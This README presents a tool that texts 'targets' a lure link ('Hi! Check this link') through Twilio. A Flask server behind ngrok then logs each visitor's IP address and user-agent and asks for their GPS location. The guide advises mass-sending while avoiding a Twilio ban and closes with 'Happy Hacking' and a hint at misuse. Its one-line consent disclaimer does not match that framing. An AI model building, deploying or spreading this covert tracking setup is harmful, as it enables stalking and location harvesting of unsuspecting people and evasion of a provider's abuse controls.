# IPLOGGER USING SMS

***Flask Server***

*The Flask server, written in Python, handles the following:*

**IP and User-Agent Logging:**

`Captures the request's metadata when the target visits the link.`

**Geolocation Request:**

`Serves an HTML page with JavaScript that prompts the target to share their location.`

**Geolocation Logging:**

`Receives the latitude and longitude (if the target consents) via a POST request.`

**How to Run the Server**

***Install Flask:***
`Make sure you have Flask and Twilio installed. Run this command:`
```bash
pip install flask twilio
```

***Run the Server:***
`Start the server by running:`
```bash
python server.py
```
*Expose the Server to the Internet: Use a service like ngrok to make the server accessible:*
```bash
ngrok http 8080
```
*Copy the generated URL (e.g., http://your-ngrok-url.ngrok.io) and use it as the base URL for your /track endpoint.*

**Sending the Link**

`To send the link to the target device via SMS, you can use Twilio (or any other SMS service).`

***Using Twilio***

*Run the SMS Script: Execute the Twilio SMS script to send the link:*
```bash
python send_sms.py
```

*If you end up using Twilio, Keep in mind:*

**You Can Send messages in bulk to many people, Just don't over do it or else Twilio will catch on and ban you.**

`To Do so, Just copy and paste this part of the code and put it below the original code, and change the phone number to the number you desire.`
```python
message = client.messages.create(
    body="Hi! Check this link: http://your-ngrok-url.ngrok.io/track",
    from_='+1234567890',  # Your Twilio phone number
    to='+14155552671'  # Target phone number
)
```

***An Example would be:***
```python
from twilio.rest import Client

account_sid = 'YOUR_ACCOUNT_SID'
auth_token = 'YOUR_AUTH_TOKEN'

client = Client(account_sid, auth_token)

message = client.messages.create(
    body="Hi! Check this link: http://your-ngrok-url.ngrok.io/track",
    from_='+1234567890',  # Your Twilio phone number
    to='+14155552671'  # Target phone number
)
message = client.messages.create(
    body="Hi! Check this link: http://your-ngrok-url.ngrok.io/track",
    from_='+1234567890',
    to='+14139239481'
)

print(f"Message sent: {message.sid}")
```

***What Happens:***

***1***. *The target receives the SMS with the link.*

***2***. *When they click the link:*

***3***. *The server logs their IP address and user-agent.*

***4***. *If they allow geolocation access, the latitude and longitude are also logged.*

**Example**

`When the link is clicked:`

***Console logs:***
```yaml
IP Address: 127.0.0.1
User Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15
Latitude: 53.8371663
Longitude: -9.3515381
```
***Lookup the Latitude and Logitude on Google Maps for a fun surprise :)***

**Important Notes**

***Ethical Use:***

*Ensure the target has explicitly consented to this process.*
***Legal Compliance:***

*Verify compliance with local laws and regulations.*

***Testing:***

*Use ngrok for testing, but for production, deploy on a proper hosting service (e.g., AWS, Azure, etc.).*

***Feel Free to modify the code to your liking if ykwim.***

**Happy Hacking ;)**
